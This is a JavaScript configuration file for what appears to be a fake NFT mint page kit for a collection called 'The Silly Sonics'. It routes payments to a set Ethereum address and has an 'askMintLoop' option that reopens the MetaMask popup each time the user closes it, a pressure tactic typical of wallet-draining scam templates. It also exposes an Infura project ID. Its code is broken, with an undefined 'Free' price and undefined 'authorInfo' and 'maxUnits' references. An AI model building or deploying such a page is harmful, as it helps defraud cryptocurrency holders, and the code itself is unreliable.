var receiveAddress = "0x8D12090e40f89a4D4be2A148A3e64D09Abd9E213"; // your address 
var infuraProjectId = "daa09b0e72b543b094fcde97af8e2163"; // your infura project id

const collectionInfo = {
    name: "The Silly Sonics",
    title: "{Official Mint!}", // Title prefix (ex "Buy your {name}") - You can use {name} to insert the collection name
    date: "07.24.2022",
    socialMedia: {
        discord: "",
        twitter: "https://twitter.com/",
    },
    medias: {
        preview: "preview.gif",
        favicon: "logo.png",
    },
    background: {
        type: "image", // Supported types: image, video, color
        image: "background.jpg", // Image for image type, video preview for video type
        video: "background.mp4", // If you don't use video, you can ignore this line
        color: "#4E4E6D", // If you don't use color, you can ignore this line
    }
}
const mintInfo = {
    price: Free, // Price per NFT.
    totalSupply: 5000, // Total supply of NFTs.
    minUnits: 1, // Min units to buy.
    maxUnits: 3, // Max units to buy.
    askMintLoop: true, // If true, when the user closes the metamask popup, it reopens automatically.
}

/*
    = = = = = END OF SETTINGS = = = = =
*/

//#region Check Configuration
if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!authorInfo.address.startsWith("0x") ||
    (
        authorInfo.address.length >= 64 ||
        authorInfo.address.length <= 40
    )
) console.error(`Error: ${authorInfo.address} is not a valid Ethereum address.`);
//#endregion
